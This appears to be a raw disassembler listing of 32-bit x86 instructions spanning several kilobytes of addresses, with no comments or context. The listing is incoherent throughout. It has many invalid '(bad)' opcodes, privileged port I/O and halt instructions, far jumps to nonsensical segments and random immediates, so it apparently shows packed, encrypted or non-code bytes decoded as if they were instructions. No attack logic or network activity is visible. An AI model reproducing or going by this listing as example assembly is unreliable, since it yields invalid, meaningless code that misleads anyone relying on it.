  4128de:	mov    ds:0x76470b6b,eax
  4128e3:	fs push ss
  4128e5:	inc    edi
  4128e6:	stos   DWORD PTR es:[edi],eax
  4128e7:	adc    eax,0x9684eac8
  4128ec:	(bad)  
  4128ed:	stc    
  4128ee:	mov    edi,0xd1f0bf0e
  4128f3:	sbb    dh,BYTE PTR [eax-0x7366615f]
  4128f9:	(bad)  
  4128fa:	daa    
  4128fb:	or     eax,0x2c7a34b9
  412900:	cmp    edx,DWORD PTR [ecx]
  412902:	sbb    al,0x9b
  412904:	mov    edi,DWORD PTR [ebp+0x39]
  412907:	mov    ch,0xb
  412909:	and    DWORD PTR [eax-0x42ee957b],0x89c2363b
  412913:	pop    ds
  412914:	cmp    eax,edx
  412916:	pop    ecx
  412917:	push   esi
  412918:	ret    
  412919:	in     eax,0x27
  41291b:	adc    BYTE PTR [edi+eiz*2+0x7fa08598],dh
  412922:	pop    edi
  412923:	push   0xffffffab
  412925:	mov    ds:0x6d8a48b5,al
  41292a:	pop    ds
  41292b:	ficom  WORD PTR [ecx]
  41292d:	push   es
  41292e:	sahf   
  41292f:	xchg   edx,eax
  412930:	push   es
  412931:	pop    eax
  412932:	hlt    
  412933:	test   al,0x60
  412935:	pop    edi
  412936:	pop    ebp
  412937:	bound  esp,QWORD PTR [eax]
  412939:	dec    edi
  41293a:	push   0xffffff89
  41293c:	in     eax,dx
  41293d:	cmp    eax,0xfb189a20
  412942:	pop    ecx
  412943:	jge    0x412940
  412945:	xlat   BYTE PTR ds:[ebx]
  412946:	lods   al,BYTE PTR ds:[esi]
  412947:	xchg   BYTE PTR ds:0xdf6ed7a8,bl
  41294d:	imul   esp,edx,0xeba81173
  412953:	mov    ds:0x38aac520,al
  412958:	or     DWORD PTR [eax-0x50],edx
  41295b:	clc    
  41295c:	mov    ds:0xafc3a937,eax
  412961:	nop
  412962:	jnp    0x412907
  412964:	ins    DWORD PTR es:[edi],dx
  412965:	push   ss
  412966:	out    dx,eax
  412967:	inc    esi
  412968:	cdq    
  412969:	adc    eax,0x343241f4
  41296e:	add    esp,0xffffffe5
  412971:	shl    esi,cl
  412973:	aam    0xf2
  412975:	mov    edx,0x71413af5
  41297a:	(bad)  
  41297c:	test   eax,0x5ea76485
  412981:	jnp    0x412951
  412983:	jmp    0xf244fb81
  412988:	test   eax,0xd665e453
  41298d:	fwait
  41298e:	div    DWORD PTR [ebp-0x5f]
  412991:	jnp    0x4129d7
  412993:	xchg   DWORD PTR [esi-0x38],edi
  412996:	push   esi
  412997:	mov    esi,0xa2b4da63
  41299c:	xchg   BYTE PTR [edx+edi*4],ch
  41299f:	in     al,0x79
  4129a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129a2:	mov    ebp,0xe66d6649
  4129a7:	jb     0x41294d
  4129a9:	adc    BYTE PTR [eax+edx*8+0x6f1fc45f],dh
  4129b0:	rcl    DWORD PTR [esi-0x50],cl
  4129b3:	bound  esi,QWORD PTR [edx]
  4129b5:	sbb    bl,dh
  4129b7:	push   esi
  4129b8:	lods   eax,DWORD PTR ds:[esi]
  4129b9:	ret    0xf198
  4129bc:	addr16 push edi
  4129be:	fisubr DWORD PTR [esi]
  4129c0:	sub    DWORD PTR [edx-0x71077b7c],0x36
  4129c7:	imul   eax,ebx,0x4ac456f2
  4129cd:	or     bl,BYTE PTR [ecx-0x35704b5f]
  4129d3:	in     al,0x15
  4129d5:	xor    al,bh
  4129d7:	cmp    BYTE PTR [edx-0x4d63285],ch
  4129dd:	in     al,dx
  4129de:	push   edx
  4129df:	hlt    
  4129e0:	mov    cl,0x51
  4129e2:	jae    0x412a23
  4129e4:	mov    edx,0xe1bfe742
  4129e9:	addr16 sub ah,dh
  4129ec:	lods   eax,DWORD PTR ds:[esi]
  4129ed:	push   0xffffffb9
  4129ef:	mov    ebp,0x7bc08597
  4129f4:	cld    
  4129f5:	inc    esi
  4129f6:	loopne 0x4129d6
  4129f8:	in     eax,0x23
  4129fa:	pop    eax
  4129fb:	mov    bl,0x87
  4129fd:	pop    esi
  4129fe:	out    dx,al
  4129ff:	(bad)  
  412a00:	jg     0x412a03
  412a02:	jmp    0x412a6a
  412a04:	fldcw  WORD PTR ds:0xd8bda81a
  412a0a:	push   0x5c
  412a0c:	jo     0x412991
  412a0e:	arpl   WORD PTR [edi],dx
  412a10:	fisubr DWORD PTR [ebp+eiz*4+0x529f391e]
  412a17:	xchg   ebx,eax
  412a18:	and    ch,BYTE PTR [ecx]
  412a1a:	xchg   edi,esp
  412a1c:	(bad)  
  412a1d:	lock mov edi,0x311fc4ab
  412a23:	xor    dl,BYTE PTR [eax-0x2b]
  412a26:	pop    ecx
  412a27:	sbb    DWORD PTR [esi+0x5da79dae],edi
  412a2d:	enter  0xcedc,0xd5
  412a31:	addr16 dec sp
  412a34:	imul   edx,DWORD PTR [ebx-0x1c],0x3c
  412a38:	jns    0x412a52
  412a3a:	sbb    ah,BYTE PTR [esi+0x3d]
  412a3d:	sub    BYTE PTR fs:[ecx],0x3c
  412a41:	ret    
  412a42:	push   0xbd19ade5
  412a47:	pop    es
  412a48:	call   0xe60d82f8
  412a4d:	mov    bl,0x6a
  412a4f:	push   esp
  412a50:	test   eax,0x4fd179f9
  412a55:	mov    ds:0x67ef7e11,al
  412a5a:	xlat   BYTE PTR ds:[ebx]
  412a5b:	fwait
  412a5c:	data16 mov dl,0x93
  412a5f:	pop    esi
  412a60:	add    DWORD PTR [edi+0x6b],edx
  412a63:	popf   
  412a64:	dec    edx
  412a65:	(bad)  
  412a66:	dec    edx
  412a67:	sub    esp,ebx
  412a69:	pop    edx
  412a6a:	pop    ecx
  412a6b:	pusha  
  412a6c:	push   ss
  412a6d:	dec    esp
  412a6e:	test   DWORD PTR [ecx+0x23],esi
  412a71:	loopne 0x412a01
  412a73:	ds push ecx
  412a75:	jmp    0x719b:0x4179a935
  412a7c:	pop    ebx
  412a7d:	adc    esi,DWORD PTR [ecx+0x2f]
  412a80:	cmp    al,0x8a
  412a82:	into   
  412a83:	and    ebx,DWORD PTR [ecx]
  412a85:	movsx  edx,si
  412a88:	pop    es
  412a89:	mov    esi,0xbff4bf9c
  412a8e:	lods   eax,DWORD PTR ds:[esi]
  412a8f:	cdq    
  412a90:	das    
  412a91:	icebp  
  412a92:	out    dx,eax
  412a93:	inc    eax
  412a94:	cld    
  412a95:	fadd   QWORD PTR [esi+0x1b]
  412a98:	ds out dx,eax
  412a9a:	imul   eax,DWORD PTR ds:0xfe9a5383,0x35
  412aa1:	mov    eax,fs
  412aa3:	test   DWORD PTR ds:0x4a7ac089,edx
  412aa9:	fdivrp st(1),st
  412aab:	es inc esp
  412aad:	lea    ebx,[eax-0x6daea683]
  412ab3:	jp     0x412a6f
  412ab5:	sbb    al,0x16
  412ab7:	add    bh,al
  412ab9:	call   0x40b0:0x228adc53
  412ac0:	and    DWORD PTR [ebp+edi*4+0x48],ebp
  412ac4:	xchg   edi,eax
  412ac5:	loope  0x412b30
  412ac7:	dec    edx
  412ac8:	ins    DWORD PTR es:[edi],dx
  412ac9:	pop    esi
  412aca:	dec    esp
  412acb:	jg     0x412a7b
  412acd:	pusha  
  412ace:	mov    cl,BYTE PTR [ecx]
  412ad0:	dec    ebx
  412ad1:	sbb    dh,cl
  412ad3:	push   ebp
  412ad4:	xor    al,0x4d
  412ad6:	mov    fs,WORD PTR [esi-0x25953b6c]
  412adc:	push   0xd3523a28
  412ae1:	outs   dx,BYTE PTR ds:[esi]
  412ae2:	push   ss
  412ae3:	and    BYTE PTR [ebp+0x69601e42],bl
  412ae9:	(bad)  
  412aea:	(bad)  
  412aeb:	jmp    0x7936:0x5d9d1ec0
  412af2:	xor    ebp,DWORD PTR [edx+0x67]
  412af5:	xor    bh,al
  412af7:	ret    0x9bb3
  412afa:	cmp    al,0xc8
  412afc:	add    ebx,ebp
  412afe:	cld    
  412aff:	in     al,dx
  412b00:	ss (bad) 
  412b02:	sub    eax,0xe93f21e1
  412b07:	mov    ds:0x954e5c41,al
  412b0c:	add    DWORD PTR fs:[ebx-0x13],ebp
  412b10:	push   esi
  412b11:	enter  0xf01,0x6f
  412b15:	les    esi,FWORD PTR [ecx+0x6a]
  412b18:	test   DWORD PTR [edx+0x4c],esi
  412b1b:	or     BYTE PTR [ecx-0x44cb3a0c],dl
  412b21:	lods   eax,DWORD PTR ds:[esi]
  412b22:	mov    esp,eax
  412b24:	int3   
  412b25:	fld    DWORD PTR [ebx-0x4a255a]
  412b2b:	dec    esi
  412b2c:	(bad)  
  412b2d:	sti    
  412b2e:	ret    0xeeb8
  412b31:	int3   
  412b32:	nop
  412b33:	imul   edx,DWORD PTR [ebx],0xffffffca
  412b36:	mov    DWORD PTR [edi],0xf9917c77
  412b3c:	hlt    
  412b3d:	pop    esp
  412b3e:	bound  esi,QWORD PTR [ebx-0x2a]
  412b41:	xchg   edi,eax
  412b42:	add    BYTE PTR ds:0x88b9b8dd,bl
  412b48:	loope  0x412bbb
  412b4a:	mov    ds:0x72ee5f72,eax
  412b4f:	icebp  
  412b50:	outs   dx,DWORD PTR ds:[esi]
  412b51:	shr    BYTE PTR [eax+0x6f733e0f],0x8b
  412b58:	and    cl,BYTE PTR [eax]
  412b5a:	addr16 in al,dx
  412b5c:	and    al,0xb4
  412b5e:	xchg   esp,eax
  412b5f:	loop   0x412aed
  412b61:	ins    BYTE PTR es:[edi],dx
  412b62:	xchg   ecx,eax
  412b63:	in     eax,0x49
  412b65:	mov    ch,0x22
  412b67:	push   0x72
  412b69:	(bad)  
  412b6a:	ja     0x412b08
  412b6c:	jmp    0xb059:0x29c7b164
  412b73:	ds sar esp,1
  412b76:	mov    bh,0xeb
  412b78:	jo     0x412b9d
  412b7a:	std    
  412b7b:	icebp  
  412b7c:	pushf  
  412b7d:	enter  0xd04c,0x13
  412b81:	shl    BYTE PTR [edi-0x10f72157],cl
  412b87:	aam    0xd1
  412b89:	retf   0x8600
  412b8c:	shr    BYTE PTR [esi+0x27],0x33
  412b90:	cld    
  412b91:	popf   
  412b92:	jbe    0x412b76
  412b94:	mov    edi,0xc3172f05
  412b99:	cmc    
  412b9a:	arpl   WORD PTR [eax-0xe07aa19],di
  412ba0:	sbb    ebx,DWORD PTR [esi+esi*8+0x1d]
  412ba4:	stc    
  412ba5:	(bad)  
  412ba6:	mov    dl,dl
  412ba8:	jl     0x412b46
  412baa:	(bad)  
  412bae:	mov    dh,0x78
  412bb0:	jmp    0x412bcd
  412bb2:	sub    DWORD PTR ds:0xfe863e88,eax
  412bb9:	jmp    0xe4c77eea
  412bbe:	push   esp
  412bbf:	add    al,ah
  412bc1:	xor    al,0xe6
  412bc3:	fnstcw WORD PTR [ecx-0x37]
  412bc6:	inc    eax
  412bc7:	xlat   BYTE PTR ds:[ebx]
  412bc8:	icebp  
  412bc9:	ins    DWORD PTR es:[edi],dx
  412bca:	ins    DWORD PTR es:[edi],dx
  412bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bcc:	xchg   edx,eax
  412bcd:	or     BYTE PTR [ecx-0x1f],0x11
  412bd1:	mov    WORD PTR [edx-0x32affc2],ss
  412bd7:	out    dx,al
  412bd8:	dec    edx
  412bd9:	fbstp  TBYTE PTR [ecx]
  412bdb:	repnz cmp BYTE PTR [edx],ch
  412bde:	dec    ecx
  412bdf:	lock push eax
  412be1:	rcl    BYTE PTR [edi+eiz*4],0xd4
  412be5:	jno    0x412c41
  412be7:	pop    ebx
  412be8:	sahf   
  412be9:	aas    
  412bea:	mov    esp,DWORD PTR [edi]
  412bec:	adc    DWORD PTR [edi+0x3a],ebx
  412bef:	jb     0x412ba3
  412bf1:	scas   al,BYTE PTR es:[edi]
  412bf2:	sbb    DWORD PTR [ebx],ecx
  412bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bf5:	xor    eax,0xca654d44
  412bfa:	inc    ecx
  412bfb:	dec    sp
  412bfd:	enter  0x8b63,0xbe
  412c01:	in     eax,0x65
  412c03:	sbb    DWORD PTR [eax-0x67],0x1e444b3
  412c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c0b:	fs xchg ebx,eax
  412c0d:	in     eax,0x98
  412c0f:	les    eax,FWORD PTR [eax]
  412c11:	test   eax,0x9218bbc1
  412c16:	mov    ds:0xac58f3c2,al
  412c1b:	mov    eax,ds:0xcc2971dc
  412c20:	adc    esi,DWORD PTR [ecx+0x75015ad8]
  412c26:	mov    esi,0x244ee090
  412c2b:	mov    esp,0xf59d055
  412c30:	add    eax,DWORD PTR [esp+edi*4-0x530bfaeb]
  412c37:	ds in  eax,dx
  412c39:	mov    cl,BYTE PTR [ebp+0xc96bb0e]
  412c3f:	lea    esp,[edi+0x7c]
  412c42:	xor    bh,BYTE PTR ds:0x4d0123cf
  412c48:	icebp  
  412c49:	jns    0x412c69
  412c4b:	pop    eax
  412c4c:	std    
  412c4d:	sti    
  412c4e:	and    DWORD PTR [ebx-0x70],0xfc3254b4
  412c55:	jbe    0x412c44
  412c57:	and    DWORD PTR [esi],edi
  412c59:	mov    WORD PTR [ebp+eiz*4+0x4ff4c6a0],?
  412c60:	cdq    
  412c61:	ins    BYTE PTR es:[edi],dx
  412c62:	xor    DWORD PTR [ebx-0x25],edx
  412c65:	mov    ah,0xe2
  412c67:	xchg   edx,eax
  412c68:	leave  
  412c69:	sub    eax,DWORD PTR [esp+ecx*8-0xa]
  412c6d:	add    dh,BYTE PTR [ecx-0x538cc55f]
  412c73:	shl    DWORD PTR [ebp-0x147a55bb],0x1b
  412c7a:	sbb    eax,0x6709334b
  412c7f:	dec    eax
  412c80:	lahf   
  412c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c82:	or     al,0x24
  412c84:	imul   esp,ecx,0xffffffd3
  412c87:	xchg   esi,eax
  412c88:	mov    ebx,0x6262b6b8
  412c8d:	cmp    al,0x13
  412c8f:	dec    esp
  412c90:	cwde   
  412c91:	inc    ebx
  412c92:	mov    BYTE PTR [eax+0x1ce67f54],dh
  412c98:	xchg   DWORD PTR [ebp+0x3374272e],edi
  412c9e:	dec    eax
  412c9f:	push   eax
  412ca0:	xlat   BYTE PTR ds:[ebx]
  412ca1:	lods   al,BYTE PTR ds:[esi]
  412ca2:	(bad)  
  412ca3:	push   ebx
  412ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca5:	les    ebp,FWORD PTR [ecx-0x7d]
  412ca8:	sbb    al,0x30
  412caa:	sub    bl,BYTE PTR [ebp+0x4132ff94]
  412cb0:	loopne 0x412c42
  412cb2:	pusha  
  412cb3:	fld    TBYTE PTR [edi-0x61388a30]
  412cb9:	fild   QWORD PTR [edx+ebx*1+0x20]
  412cbd:	sub    edx,DWORD PTR [ebp+0xa]
  412cc0:	fiadd  WORD PTR [ebx+0x76]
  412cc3:	pop    ss
  412cc4:	outs   dx,DWORD PTR ds:[esi]
  412cc5:	inc    esi
  412cc6:	pop    es
  412cc7:	mov    ebx,0x44892544
  412ccc:	push   ebx
  412ccd:	xchg   dh,bl
  412ccf:	into   
  412cd0:	into   
  412cd1:	lds    ebp,FWORD PTR ds:0x96fb8c49
  412cd7:	test   BYTE PTR [esi-0x61fe261c],0x94
  412cde:	repz sub eax,0x46f34141
  412ce4:	retf   0x99a5
  412ce7:	ins    BYTE PTR es:[edi],dx
  412ce8:	jae    0x412cc2
  412cea:	jns    0x412d48
  412cec:	and    al,0x73
  412cee:	xor    edx,DWORD PTR [esi+ebp*1-0x1f29970b]
  412cf5:	fs sti 
  412cf7:	inc    edi
  412cf8:	fsub   DWORD PTR [ebx]
  412cfa:	mov    esp,0xa647391f
  412cff:	sbb    ch,BYTE PTR [esi]
  412d01:	lds    esi,FWORD PTR [eax]
  412d03:	pop    esp
  412d04:	sub    esi,DWORD PTR [ebp+0x38964e86]
  412d0a:	dec    esi
  412d0b:	pop    ss
  412d0c:	pop    esp
  412d0d:	fcompp 
  412d0f:	sar    ah,cl
  412d11:	jne    0x412d35
  412d13:	add    ah,BYTE PTR [ecx-0x7f]
  412d16:	dec    edi
  412d17:	jns    0x412d1a
  412d19:	lods   eax,DWORD PTR ds:[esi]
  412d1a:	or     ebp,ecx
  412d1c:	jp     0x412d29
  412d1e:	mov    esi,0x2b
	...
  412eef:	add    BYTE PTR [esi-0x77],bl
  412ef2:	add    eax,0x7feed766
  412ef7:	mov    ecx,0x4f6277d8
  412efc:	add    eax,0x7f47114d
  412f01:	dec    esp
  412f02:	add    DWORD PTR [eax],eax
  412f04:	and    al,BYTE PTR [edi]
  412f06:	add    BYTE PTR [eax],al
  412f08:	jne    0x412ea0
  412f0a:	jmp    0x412e98
  412f0c:	jl     0x412f03
  412f0e:	(bad)  
  412f0f:	(bad)  
  412f10:	and    ah,BYTE PTR ds:0xf7025aef
  412f16:	sub    DWORD PTR [edi-0x3035d8d7],edi
  412f1c:	ds scas al,BYTE PTR es:[edi]
  412f1e:	xchg   edx,esi
  412f20:	xchg   si,ax
  412f22:	cmp    bh,BYTE PTR [edx+ebx*2+0x6ff7293b]
  412f29:	into   
  412f2a:	push   edi
  412f2b:	dec    eax
  412f2c:	je     0x412f21
  412f2e:	(bad)  
  412f2f:	repz call 0x3b6c:0xb04f2bbf
  412f37:	jl     0x412f55
  412f39:	pop    ebp
  412f3a:	jl     0x412f64
  412f3c:	mov    esi,0x1f665001
  412f41:	pop    edx
  412f42:	push   cs
  412f43:	pop    esp
  412f44:	cmp    eax,0x1f670f95
  412f49:	fld    QWORD PTR [ecx-0x11c7467]
  412f4f:	or     al,0x88
  412f51:	xchg   BYTE PTR [ebx+edi*8-0x7e],cl
  412f55:	sub    al,0x8d
  412f57:	gs jmp 0x13b719eb
  412f5d:	pop    ebx
  412f5e:	xchg   edx,eax
  412f5f:	push   0x1948cac4
  412f64:	mov    esp,0x9afe620f
  412f69:	jmp    0x412f42
  412f6b:	mov    bh,0x60
  412f6d:	popa   
  412f6e:	stc    
  412f6f:	outs   dx,DWORD PTR ds:[esi]
  412f70:	push   es
  412f71:	dec    esi
  412f72:	dec    ebp
  412f73:	xor    ebx,DWORD PTR [esi+0x41]
  412f76:	test   eax,0x95c11cc3
  412f7b:	repnz cmc 
  412f7d:	call   0x84860325
  412f82:	repz push ebp
  412f84:	nop
  412f85:	sbb    eax,0x2ba59f7b
  412f8a:	in     eax,0x5e
  412f8c:	jno    0x412f69
  412f8e:	div    BYTE PTR [esi-0x65]
  412f91:	(bad)  
  412f92:	xchg   esp,eax
  412f93:	repz mov edi,0x7ddbd8e8
  412f99:	dec    ebx
  412f9a:	add    ecx,DWORD PTR [ebx+eiz*8-0x55]
  412f9e:	sti    
  412f9f:	jb     0x412fef
  412fa1:	add    edi,esp
  412fa3:	jmp    0x8377dc44
  412fa8:	cmp    ah,BYTE PTR [eax]
  412faa:	add    ebx,ebp
  412fac:	test   al,0x38
  412fae:	pop    ecx
  412faf:	mov    eax,0x5e609771
  412fb4:	inc    edx
  412fb5:	(bad)  
  412fb6:	fdivr  QWORD PTR [ecx]
  412fb8:	outs   dx,BYTE PTR ds:[esi]
  412fb9:	sub    bh,cl
  412fbb:	xchg   esp,eax
  412fbc:	adc    esp,DWORD PTR [ecx-0x1e]
  412fbf:	loop   0x412f99
  412fc1:	push   esp
  412fc2:	sbb    al,0xd5
  412fc4:	xor    sp,WORD PTR [esi+0x283f0978]
  412fcb:	pop    ss
  412fcc:	xor    DWORD PTR [ebx-0x16],ebp
  412fcf:	mov    eax,ds:0x6b2ea563
  412fd4:	sbb    eax,0xf74f4fcf
  412fd9:	(bad)  
  412fda:	clc    
  412fdb:	stos   DWORD PTR es:[edi],eax
  412fdc:	jbe    0x412f93
  412fde:	xchg   ebp,eax
  412fdf:	enter  0xe13a,0x22
  412fe3:	mov    bl,0xfa
  412fe5:	adc    eax,DWORD PTR ds:0xc445aa8c
  412feb:	push   ss
  412fec:	add    DWORD PTR [edx+0x745c4dcc],ecx
  412ff2:	ins    BYTE PTR es:[edi],dx
  412ff3:	xlat   BYTE PTR ds:[ebx]
  412ff4:	cmc    
  412ff5:	mov    eax,ds:0x4ac80447
  412ffa:	jge    0x412fc1
  412ffc:	xor    al,0xcf
  412ffe:	fidiv  DWORD PTR [eax]
  413000:	or     DWORD PTR [ebp-0x6],0xffffffcc
  413004:	push   ecx
  413005:	ins    DWORD PTR es:[edi],dx
  413006:	shr    BYTE PTR [edi+edi*4],cl
  413009:	(bad)  
  41300a:	xchg   ebp,eax
  41300b:	ret    0xd074
  41300e:	clc    
  41300f:	cmp    al,BYTE PTR [edi+eax*4+0x56b648ca]
  413016:	cmp    dh,ch
  413018:	adc    eax,0x28afcc98
  41301d:	dec    edi
  41301e:	xchg   esp,eax
  41301f:	xor    DWORD PTR [ebx+0x45],ebp
  413022:	imul   esi,ebp,0xffffff91
  413025:	jno    0x413042
  413027:	fs inc ecx
  413029:	cwde   
  41302a:	jb     0x41302d
  41302c:	adc    cl,bh
  41302e:	repnz pop edx
  413030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413031:	sub    esi,edi
  413033:	add    al,bl
  413035:	lods   eax,DWORD PTR ds:[esi]
  413036:	inc    ebx
  413037:	repnz cmp ebp,DWORD PTR [ecx-0x3d50fb37]
  41303e:	inc    ecx
  41303f:	and    BYTE PTR [ecx-0x20],0xa8
  413043:	or     BYTE PTR [esi],dh
  413045:	jne    0x4130b6
  413047:	sbb    al,BYTE PTR [ebx+0x63]
  41304a:	pop    ebx
  41304b:	adc    eax,0xb854b4b5
  413050:	xor    dl,BYTE PTR [edx]
  413052:	mov    edi,eax
  413054:	dec    ebx
  413055:	(bad)  
  413056:	lock cmp BYTE PTR [eax],bh
  413059:	cwde   
  41305a:	out    dx,al
  41305b:	mov    eax,0xf990548e
  413060:	clc    
  413061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413062:	pushf  
  413063:	push   edx
  413064:	std    
  413065:	(bad)  
  413066:	cmp    eax,0x26b13077
  41306b:	xchg   DWORD PTR [ebx+0x79],esi
  41306e:	jnp    0x41302a
  413070:	lods   al,BYTE PTR ds:[esi]
  413071:	pop    esi
  413072:	lods   eax,DWORD PTR ds:[esi]
  413073:	adc    bh,dl
  413075:	mov    ah,0x50
  413077:	les    edx,FWORD PTR [ecx-0x19]
  41307a:	mov    al,0x47
  41307c:	dec    edx
  41307d:	xor    eax,0x6167d31
  413082:	and    bl,BYTE PTR [edx+0x5f]
  413085:	mov    dl,0x14
  413087:	rol    BYTE PTR [ebx-0x13],1
  41308a:	xchg   esp,eax
  41308b:	dec    eax
  41308c:	aad    0x18
  41308e:	lods   al,BYTE PTR ds:[esi]
  41308f:	stos   BYTE PTR es:[edi],al
  413090:	daa    
  413091:	mov    esp,0x6fc1b9ca
  413096:	mov    ch,0x65
  413098:	xor    dl,bl
  41309a:	aam    0x8b
  41309c:	dec    edi
  41309d:	mov    WORD PTR [ebp+0x6c5b2a69],?
  4130a3:	pusha  
  4130a4:	ret    0xdeb2
  4130a7:	xor    DWORD PTR [eax+eax*4-0x60],0x7a7c5337
  4130af:	jmp    0x413052
  4130b1:	mov    BYTE PTR [esi],dl
  4130b3:	sub    eax,0xeb94a12
  4130b8:	clc    
  4130b9:	adc    ch,BYTE PTR [esi-0x63]
  4130bc:	dec    edx
  4130bd:	dec    eax
  4130be:	push   DWORD PTR [edx+ecx*2+0x4]
  4130c2:	scas   al,BYTE PTR es:[edi]
  4130c3:	je     0x4130c7
  4130c5:	cmp    cl,bh
  4130c7:	add    ebx,DWORD PTR [esi+0x47ba2046]
  4130cd:	test   al,0xfc
  4130cf:	out    dx,al
  4130d0:	(bad)  [ecx+0x6]
  4130d3:	or     DWORD PTR [edx-0x7d],ebp
  4130d6:	xor    eax,0x82dccae4
  4130db:	out    dx,eax
  4130dc:	pop    esp
  4130dd:	pop    ecx
  4130de:	cwde   
  4130df:	(bad)  
  4130e0:	(bad)  
  4130e1:	je     0x413148
  4130e3:	(bad)  
  4130e4:	xlat   BYTE PTR ds:[ebx]
  4130e5:	test   al,0x34
  4130e7:	xor    BYTE PTR [eax+esi*2],dl
  4130ea:	jo     0x4130e9
  4130ec:	or     esp,0x12e0fa35
  4130f2:	inc    ebp
  4130f3:	enter  0x9c78,0x88
  4130f7:	and    al,0x2f
  4130f9:	inc    edx
  4130fa:	mov    ebp,0x3447aa0d
  4130ff:	push   ebx
  413100:	fldenv [eax]
  413102:	(bad)  
  413103:	mov    DWORD PTR [ecx],ebp
  413105:	das    
  413106:	int3   
  413107:	mov    dl,0x3b
  413109:	fcom   QWORD PTR [edx-0x79f95047]
  41310f:	sbb    al,0xeb
  413111:	add    WORD PTR ss:[ecx],ax
  413115:	or     cl,dl
  413117:	inc    ecx
  413118:	gs sahf 
  41311a:	fst    QWORD PTR [ecx]
  41311c:	mov    ds:0xba74bc70,eax
  413121:	mov    esi,DWORD PTR [ebx]
  413123:	cdq    
  413124:	sub    esi,DWORD PTR [ebx-0x380aff2c]
  41312a:	imul   edi,DWORD PTR [esp+eax*2+0x52f32ab5],0x37
  413132:	xchg   BYTE PTR [ebp-0x4a],dl
  413135:	sbb    eax,0x559d3e6e
  41313a:	or     eax,0x5197bf0b
  41313f:	frstor [esi]
  413141:	or     eax,0xd0f7ba7d
  413146:	mov    WORD PTR [eax-0x553e94c5],gs
  41314c:	adc    DWORD PTR [ecx-0x29cf462c],edx
  413152:	and    eax,0x31ef2ff5
  413157:	xchg   esp,eax
  413158:	xor    dh,BYTE PTR [ebp+0x6fce19a]
  41315e:	mov    DWORD PTR [ebx],0x87b6ef20
  413164:	cmp    esp,DWORD PTR [ecx+0x53]
  413167:	rcr    BYTE PTR [ebp-0x1696884c],0x5d
  41316e:	mov    DWORD PTR [eax-0x44abd673],esp
  413174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413175:	lock adc bh,dl
  413178:	jns    0x413182
  41317a:	cmp    BYTE PTR [ebp+0x475b2428],al
  413180:	ret    0xaf82
  413183:	adc    eax,0x6bcff985
  413188:	(bad)  
  413189:	aam    0x72
  41318b:	aas    
  41318c:	les    ecx,FWORD PTR [eax+ebp*1]
  41318f:	pop    esi
  413190:	cmp    DWORD PTR [ebx-0x35cbdb66],ebp
  413196:	jno    0x413177
  413198:	ins    DWORD PTR es:[edi],dx
  413199:	sbb    eax,0x4403c8eb
  41319e:	lds    ecx,FWORD PTR [edi]
  4131a0:	pop    edx
  4131a1:	or     esi,DWORD PTR [esi+0x4b5f792c]
  4131a7:	jecxz  0x4131d6
  4131a9:	adc    al,0x2e
  4131ac:	adc    al,0xea
  4131ae:	pushf  
  4131af:	mov    edi,0x6c0b29b6
  4131b4:	xor    eax,0xa07b513
  4131b9:	add    cl,BYTE PTR [eax-0x15]
  4131bc:	adc    eax,DWORD PTR [eax-0x79]
  4131bf:	sti    
  4131c0:	mul    DWORD PTR [edi+eax*4]
  4131c3:	mov    esp,DWORD PTR [edx]
  4131c5:	jnp    0x4131a8
  4131c7:	jae    0x413159
  4131c9:	push   edi
  4131ca:	mov    ds:0xcb845f46,al
  4131cf:	dec    ebx
  4131d0:	aad    0x37
  4131d2:	adc    al,0x96
  4131d4:	mov    WORD PTR [edi+eiz*4+0x3e],gs
  4131d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131d9:	xor    eax,0x36474c99
  4131de:	add    edx,DWORD PTR [ebp-0x3f05f7ea]
  4131e4:	add    eax,0x2867667a
  4131e9:	rcr    BYTE PTR [esi],0xf
  4131ec:	test   BYTE PTR [edx],dl
  4131ee:	mov    ah,0xda
  4131f0:	shl    edi,1
  4131f2:	adc    BYTE PTR [edi],bl
  4131f4:	cli    
  4131f5:	(bad)  
  4131f6:	enter  0x8ac8,0xbd
  4131fa:	pop    es
  4131fb:	lds    edx,FWORD PTR [ebp+ebx*4+0x2e]
  4131ff:	mov    ds:0xee210ca7,al
  413204:	fcmovnu st,st(4)
  413206:	inc    edi
  413207:	adc    bh,ch
  413209:	push   edx
  41320a:	xchg   ecx,eax
  41320b:	mov    BYTE PTR [edx],ch
  41320d:	sbb    bh,BYTE PTR [edi]
  41320f:	pop    ebp
  413210:	enter  0x3336,0xe5
  413214:	lods   eax,DWORD PTR ds:[esi]
  413215:	ins    BYTE PTR es:[edi],dx
  413216:	push   cs
  413217:	in     eax,dx
  413218:	stc    
  413219:	sbb    BYTE PTR [eax],dl
  41321b:	add    BYTE PTR [ebx],ch
  41321d:	mov    ah,0x7c
  41321f:	retf   0x1ab
  413222:	mov    ah,0x2a
  413224:	clc    
  413225:	inc    esp
  413226:	sub    cl,0x9
  413229:	lock cmp eax,0x874cb279
  41322f:	jecxz  0x41323c
  413231:	and    BYTE PTR [ebx+eiz*1],ch
  413234:	mov    dl,0x4e
  413236:	(bad)  
  413237:	sti    
  413238:	lock fs in ax,0xb6
  41323d:	mov    cl,0xf8
  41323f:	ret    
  413240:	and    eax,0x60eb9782
  413245:	push   0xffffffeb
  413247:	mov    BYTE PTR [edx],dh
  413249:	and    al,0x7d
  41324b:	sbb    eax,0x18bab23a
  413250:	mov    ebx,0x8f5d5afa
  413255:	out    dx,al
  413256:	jne    0x4132b5
  413258:	fist   WORD PTR [esi]
  41325a:	ins    DWORD PTR es:[edi],dx
  41325b:	rcr    DWORD PTR [eax],0xcb
  41325e:	mov    DWORD PTR [ecx-0x56d1074c],esi
  413264:	mov    esp,0x95665a93
  413269:	std    
  41326a:	mov    ch,0xa1
  41326c:	fidivr WORD PTR [ecx]
  41326e:	(bad)  
  41326f:	xacquire xchg DWORD PTR [ecx],ebx
  413272:	popa   
  413273:	inc    ebx
  413274:	fidiv  WORD PTR [edi+0x57]
  413277:	setbe  BYTE PTR [esi]
